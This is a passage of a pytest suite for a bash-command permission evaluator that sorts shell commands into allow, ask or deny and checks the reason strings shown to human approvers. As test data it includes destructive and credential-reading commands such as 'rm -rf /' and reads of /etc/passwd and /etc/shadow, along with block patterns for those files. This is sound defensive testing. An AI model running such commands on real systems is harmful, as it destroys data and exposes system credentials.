        assert self._count("   ", {}, monkeypatch, expect_error=True) == (1, 0)


class TestEvaluateConstructPolicyVerdict:
    """The construct-policy gate, hoisted out of evaluate_bash_command."""

    def test_absent_flag_is_a_no_op(self) -> None:
        """A construct that does not occur never changes the verdict."""
        assert _construct_policy_verdict(False, "subshell", "subshell (...)", "allow", {"subshell": "deny"}) == (
            "allow",
            None,
        )

    def test_deny_is_absolute(self) -> None:
        """A ``deny`` policy wins over a wildcard that already spoke."""
        assert _construct_policy_verdict(True, "subshell", "subshell (...)", "ask", {"subshell": "deny"}) == (
            "deny",
            "subshell (...) denied in config",
        )

    def test_ask_only_downgrades_allow(self) -> None:
        """``ask`` prevents auto-approval but never overwrites a decision."""
        assert _construct_policy_verdict(True, "subshell", "subshell (...)", "allow", {"subshell": "ask"}) == (
            "ask",
            "subshell (...) requires approval",
        )
        assert _construct_policy_verdict(True, "subshell", "subshell (...)", "deny", {"subshell": "ask"}) == (
            "deny",
            None,
        )

    def test_allow_policy_changes_nothing(self) -> None:
        """An explicit ``allow`` policy leaves the verdict and adds no reason."""
        assert _construct_policy_verdict(True, "subshell", "subshell (...)", "allow", {"subshell": "allow"}) == (
            "allow",
            None,
        )

    def test_missing_policy_key_fails_closed_to_ask(self) -> None:
        """An unconfigured construct key is treated as ``ask``."""
        assert _construct_policy_verdict(True, "subshell", "subshell (...)", "allow", {}) == (
            "ask",
            "subshell (...) requires approval",
        )


class TestReasonsList:
    """`reasons` is the reason string, pre-split - a host renders one bullet per entry.

    The Pi prompt draws a bullet per reason, and 63% of the reason lists the
    evaluator emits contain a `"; "` *inside a single element*, so a consumer
    that re-split the joined `reason` on `"; "` would tear one bullet into two.
    The list is therefore returned as built, de-duplicated, in append order.

    What is pinned here is the contract of that list, and it is deliberately
    NOT "`"; ".join(reasons) == reason`": the two `allow` fallbacks in
    `_finalize_reason` return an empty list and still return a `reason`, so the
    unconditional form fails on correct output and would push the implementer
    to invent a synthetic reason - changing `reason` on the two paths the
    fingerprint protects.
    """

    #: (command, config, expected status, expected segment command names). A
    #: corpus rather than one case per test: the contract is a property over
    #: verdicts, so it has to be checked against every shape the evaluator can
    #: return - allow by pattern, allow by wildcard, ask, deny, and the
    #: zero-segment path - not against whichever one was convenient.
    #:
    #: The segment list is pinned here too, and deliberately: `reasons` was
    #: added to the returned dict, and the only way to show it changed
    #: *nothing* else is to assert the other keys on the same rows.
    CORPUS: ClassVar[list[tuple[str, dict[str, Any], str, list[str]]]] = [
        # allow carrying reasons: the matched-pattern path, and an allow with
        # several of them. These are the entries the "non-empty iff status !=
        # allow" phrasing gets wrong.
        ("ls", make_config(allowed=["^ls$"]), "allow", ["ls"]),
        (
            "cat < /tmp/in > /tmp/out &",
            {
                "*": "ask",
                "allowed_cmds_regex": ["^cat"],
                "output_redirection": "allow",
                "input_redirection": "allow",
                "background_execution": "allow",
            },
            "allow",
            ["cat"],
        ),
        ("( ls )", make_config(allowed=["^ls$"], subshell="allow"), "allow", ["ls"]),
        (
            "export BOGUS=true bogus",
            make_config(allowed=[r"^export(\s+.*)?$"], variable_assignment="allow"),
            "allow",
            ["", "export"],
        ),
        # allow with nothing to explain: the wildcard decided it, so the list
        # is empty and `reason` is the fallback wording.
        ("ls", make_config(wildcard="allow"), "allow", ["ls"]),
        ("ls && cat f", make_config(wildcard="allow"), "allow", ["ls", "cat"]),
        # ask, from the wildcard and from the policies on top of it.
        ("ls -la", make_config(), "ask", ["ls"]),
        ("ls -la", make_config(allowed=["^ls$"]), "ask", ["ls"]),
        ("rm -rf / && echo done", make_config(allowed=["^ls", "^cat"]), "ask", ["rm", "echo"]),
        ("ls > /tmp/out &", make_config(allowed=["^ls"], output="ask", background="ask"), "ask", ["ls"]),
        ("export FOO=bar", make_config(variable_assignment="ask"), "ask", ["", "export"]),
        # deny, from blocked_cmds_regex and from an absolute config deny.
        ("cat /etc/passwd", make_config(blocked=["/etc/passwd"]), "deny", ["cat"]),
        ("cat /etc/passwd", {"*": "deny", "allowed_cmds_regex": ["^cat$"]}, "deny", ["cat"]),
        ("export FOO=bar", {"*": "allow", "variable_assignment": "deny"}, "deny", ["", "export"]),
        ("echo $(cat /etc/shadow)", make_config(allowed=["^echo$"], blocked=["/etc/shadow"]), "deny", ["echo", "cat"]),
    ]

    #: Commands that parse to zero segments, against configs that make the
    #: empty-segment path return a verdict a host has to explain. `_empty_segment_result`
    #: is a return path of its own, not a fall-through of the main one, so the
    #: clause-4 guarantee has to be shown to hold on it as well - and 120 of
    #: those rows across the golden corpus are `ask`.
    SEGMENTLESS_CORPUS: ClassVar[list[tuple[str, dict[str, Any], str]]] = [
        ("# just a comment", make_config(), "ask"),
        ("# just a comment", make_config(wildcard="deny"), "deny"),
        ("(( 1+2 ))", make_config(), "ask"),
        ("(( 1+2 ))", make_config(wildcard="deny"), "deny"),
        ("[[ -d /tmp ]]", make_config(), "ask"),
        ("[[ -f /etc/passwd ]]", make_config(blocked=["/etc/passwd"]), "deny"),
    ]

    @staticmethod
    def _fallback_reason(reason: str) -> bool:
        """Whether *reason* is one of the shapes an empty list may carry.

        `_finalize_reason`'s two fallbacks: the matched-pattern summary, and the
        two wordings for a wildcard allow. Anything else arriving with an empty
        list would mean a real explanation was dropped on the way to the host.
        """
        return reason.startswith("command matches allowed ") or reason in (
            "allowed",
            "allowed by wildcard policy (allow)",
        )

    @pytest.mark.parametrize(("command", "config", "status", "segments"), CORPUS)
    def test_reasons_is_a_list_and_the_rest_of_the_dict_is_untouched(
        self, command: str, config: dict[str, Any], status: str, segments: list[str]
    ) -> None:
        """`reasons` is always a list, and adding it changed no other key.

        The exact key set is asserted as well: the addition was supposed to be
        purely additive, so a host reading this dict by name must find exactly
        the four documented keys and no unexpected fifth.
        """
        result = evaluate_bash_command(command, config)
        assert set(result) == {"status", "reason", "reasons", "segments"}
        assert isinstance(result["reasons"], list)
        assert all(isinstance(entry, str) for entry in result["reasons"])
        assert result["status"] == status
        assert [segment["command"] for segment in result["segments"]] == segments

    @pytest.mark.parametrize(("command", "config", "status", "segments"), CORPUS)
    def test_the_list_joins_back_to_the_reason_whenever_it_is_not_empty(
        self, command: str, config: dict[str, Any], status: str, segments: list[str]
    ) -> None:
        # `status` / `segments` are unused here; the row is the unit, and the
        # parametrization is over the whole corpus on purpose.
        del status, segments
        result = evaluate_bash_command(command, config)
        reasons = result["reasons"]
        # Deliberately NOT asserted unconditionally. The two `allow` fallbacks
        # return an empty list and still return a `reason`, so the unconditional
        # form is false on correct output; the empty case is the next test.
        if reasons:
            assert "; ".join(reasons) == result["reason"]

    def test_the_empty_case_is_reached_so_the_conditional_is_not_vacuous(self) -> None:
        """Both halves of "whenever" are exercised, and only the non-empty half joins.

        Without this, the join assertion above could be passing simply because
        no row in the corpus has an empty list - which is the case the plan
        corrects.
        """
        joined = [row for row in self.CORPUS if evaluate_bash_command(row[0], row[1])["reasons"]]
        empty = [row for row in self.CORPUS if not evaluate_bash_command(row[0], row[1])["reasons"]]
        assert len(joined) > 0 and len(empty) > 0
        assert all(evaluate_bash_command(row[0], row[1])["status"] == "allow" for row in empty)

    @pytest.mark.parametrize(("command", "config", "status", "segments"), CORPUS)
    def test_an_empty_list_leaves_only_a_fallback_reason_behind(
        self, command: str, config: dict[str, Any], status: str, segments: list[str]
    ) -> None:
        """With no list to show, `reason` says only which pattern or wildcard allowed it.

        The exhaustive half of clause 3: an empty list next to a real
        explanation is a lost explanation, and this is the assertion that names
        it.
        """
        del status, segments
        result = evaluate_bash_command(command, config)
        if not result["reasons"]:
            assert self._fallback_reason(result["reason"]), result["reason"]

    @pytest.mark.parametrize(("command", "config", "status", "segments"), CORPUS)
    def test_no_ask_or_deny_ever_leaves_the_list_empty(
        self, command: str, config: dict[str, Any], status: str, segments: list[str]
    ) -> None:
        # This is the clause that protects the feature: it is what guarantees
        # the ask prompt always has bullets to draw. Note the converse phrasing
        # - "`reasons` is non-empty iff status != allow" - is NOT the rule and
        # over-constrains: the four `allow` rows above carry a non-empty list
        # (test_allow_legitimately_carries_reasons pins that), so a gate
        # written that way fails the other way.
        del status, segments
        result = evaluate_bash_command(command, config)
        if result["status"] != "allow":
            assert result["reasons"], f"{command!r} came back {result['status']} with no reason to show"

    @pytest.mark.parametrize(("command", "config", "status"), SEGMENTLESS_CORPUS)
    def test_the_zero_segment_path_explains_itself_too(self, command: str, config: dict[str, Any], status: str) -> None:
        """A command with no parseable segments still has to justify a non-allow verdict.

        `_empty_segment_result` is the fourth return path, and it has no
        `_finalize_reasons` behind it - it builds its own list. An ask or deny
        raised there is exactly the verdict a host most needs to explain (the
        command produced nothing it could analyse), so the guarantee has to
        hold there and not only on the main path.
        """
        result = evaluate_bash_command(command, config)
        assert result["segments"] == []
        assert result["status"] == status
        assert result["reasons"]
        assert "; ".join(result["reasons"]) == result["reason"]

    def test_allow_legitimately_carries_reasons(self) -> None:
        """An `allow` can be non-empty, which is why the converse phrasing is wrong.

        The matched-pattern path and the "redirection allowed" reasons both
        report on a successful auto-approval, and both are non-allow-listed
        ways of learning *why* something was allowed. Treating a non-empty list
        as a signal of a non-allow status would throw that information away.
        """
        by_pattern = evaluate_bash_command("ls", make_config(allowed=["^ls$"]))
        assert by_pattern["status"] == "allow"
        assert by_pattern["reasons"] == ["command matches allowed pattern: ^ls$"]

        by_redirection = evaluate_bash_command("ls > f", {"*": "allow", "output_redirection": "allow"})
        assert by_redirection["status"] == "allow"
        assert by_redirection["reasons"] == ["output redirection allowed to f"]

    def test_a_reason_containing_a_semicolon_stays_one_entry(self) -> None:
        """The reason a list exists at all: a `"; "` inside a reason is not a separator.

        Splitting the joined string here would produce two bullets from one
        reason, and the wrong first one - this is the 63%-of-corpus case.
        """
        result = evaluate_bash_command("ls -la", make_config())
        assert result["reasons"] == ['"ls" command is not allowlisted; wildcard policy is ask']
        assert result["reason"] == "; ".join(result["reasons"])

    def test_reasons_are_deduplicated_in_append_order(self) -> None:
        """Repeats collapse, order does not - the list is what `reason` was built from.

        The same blocked path is hit more than once here (per-segment, whole
        command, and substitution scan), so the naive concatenation would
        repeat a bullet; the order assertion keeps the list from being sorted
        or reversed to satisfy the dedup.
        """
        result = evaluate_bash_command(
            "echo $(cat /etc/passwd) $(cat /etc/passwd)", make_config(blocked=["/etc/passwd"])
        )
        reasons = result["reasons"]
        assert result["status"] == "deny"
        assert len(reasons) == len(set(reasons))
        # The per-segment hit and the whole-command hit are two different
        # reasons about the same pattern, in that order; the not-allowlisted
        # reason from the wildcard resolution follows them.
        assert reasons[0].startswith('Blocked by bash permissions: Argument "cat /etc/passwd"')
        assert reasons[1].startswith('Blocked by bash permissions: Argument "echo $(cat /etc/passwd)')
        assert reasons[2].startswith('"echo"')

    def test_an_unparseable_command_returns_no_dict_at_all(self) -> None:
        """The gate is scoped to evaluations that returned: a ParseError has no `reasons`.

        There is no dict to add a key to, so the contract is about successful
        evaluations only - and it is worth pinning that the error row stays an
        exception rather than becoming a partial dict.
        """
        with pytest.raises(ShfmtError):
            evaluate_bash_command("'unterminated", make_config())


class TestReasonStringsAreReadByHumans:
    """A reason is rendered into a prompt a person reads, and several of these
    were not readable.

    All three came from one command the user ran, and all three were in the
    message rather than in the verdict - the verdict was `ask` and correct, so
    nothing was functionally wrong and every one of them shipped.
    """

    def _reasons(self, command: str, config: dict[str, Any]) -> list[str]:
        from lovely_bash_permissions.evaluate import evaluate_bash_command

        return list(evaluate_bash_command(command, config)["reasons"])

    def test_a_pseudo_command_name_is_never_rendered(self) -> None:
        # `export FOO=bar echo $(echo hi)` produces a segment whose `command` is
        # "" by design - a bare assignment or declaration operand has no
        # executable name. Rendering it gave:
        #   "" , "export" commands do not match allowed patterns
        # which is both meaningless and a double mention: that same segment
        # already has its own, better reason below.
        reasons = self._reasons(
            "export FOO=bar echo $(echo hi) 2> /dev/null",
            {"*": "ask", "allowed_cmds_regex": ["^echo(\\s+.*)?$"], "variable_assignment": "ask"},
        )
        rendered = " ".join(reasons)
        assert '""' not in rendered
        assert not any(r.strip().startswith('"",') for r in reasons)

    def test_a_bare_assignment_is_reported_once_and_by_its_own_reason(self) -> None:
        reasons = self._reasons(
            "export FOO=bar echo $(echo hi) 2> /dev/null",
            {"*": "ask", "allowed_cmds_regex": ["^echo(\\s+.*)?$"], "variable_assignment": "ask"},
        )
        # "does not match" (singular), matching the one-command wording.
        mismatches = [r for r in reasons if "not match allowed patterns" in r]
        assert len(mismatches) == 1
        assert mismatches[0] == '"export" command does not match allowed patterns'

    def test_the_assignment_reason_names_only_assignments(self) -> None:
        # `export FOO=bar echo $(echo hi)` has ONE assignment and two ordinary
        # operands. The reason said all three were variable assignments, which
        # is how a user ends up looking for a `variable_assignment` rule about
        # `echo`.
        reason = self._reasons("export FOO=bar echo $(echo hi)", {"*": "ask", "variable_assignment": "ask"})[0]
        assert reason == "variable assignment requires approval: ['FOO=bar']"

    def test_an_array_assignment_still_counts_as_one(self) -> None:
        # `B=(c)` is an assignment with an array value, and `-a` is a flag. The
        # prefix test has to see through the value without eating the flag.
        reason = self._reasons("declare -a B=(c)", {"*": "allow", "variable_assignment": "deny"})[0]
        assert reason == "variable assignment denied: ['B=(c)']"

    def test_several_assignments_are_all_named(self) -> None:
        reason = self._reasons("x=1 y=2", {"*": "allow", "variable_assignment": "deny"})[0]
        assert reason == "variable assignment denied: ['x=1', 'y=2']"

    def test_an_operand_that_only_looks_like_one_is_fallible_not_wrong(self) -> None:
        # Nothing here is an assignment, so the full list is shown rather than
        # an empty one. The `variable_assignment` policy still gates the
        # construct, which is what `export A=1 B` needs.
        reason = self._reasons("declare -a B", {"*": "allow", "variable_assignment": "deny"})[0]
        assert reason == "variable assignment denied: ['-a', 'B']"

    def test_a_redirection_only_segment_says_so(self) -> None:
        # There is no command name for a name-based allow-list to match, and a
        # reason saying "does not match allowed patterns" implies a pattern
        # could. The consequence is the actionable part.
        reasons = self._reasons(
            "> /etc/x && cat f", {"*": "ask", "allowed_cmds_regex": ["^cat(\\s|$)"], "output_redirection": "deny"}
        )
        assert any('a redirection to "/etc/x" has no command name' in r for r in reasons)

    def test_the_wildcard_form_names_the_policy_that_decided_it(self) -> None:
        # Not reasons[0]: the redirection policy speaks first, and it is a
        # separate finding from the segment having no name to judge.
        reasons = self._reasons("> f", {"*": "deny"})
        assert 'a redirection to "f" produced no command; wildcard policy is deny' in reasons

    def test_an_ordinary_command_is_unaffected(self) -> None:
        # The regression guard: nothing above should have leaked into the
        # common case, which is a real command matching a pattern.
        assert self._reasons("ls -la", {"*": "ask", "allowed_cmds_regex": ["^ls(\\s|$)"]}) == [
            "command matches allowed pattern: ^ls(\\s|$)"
        ]
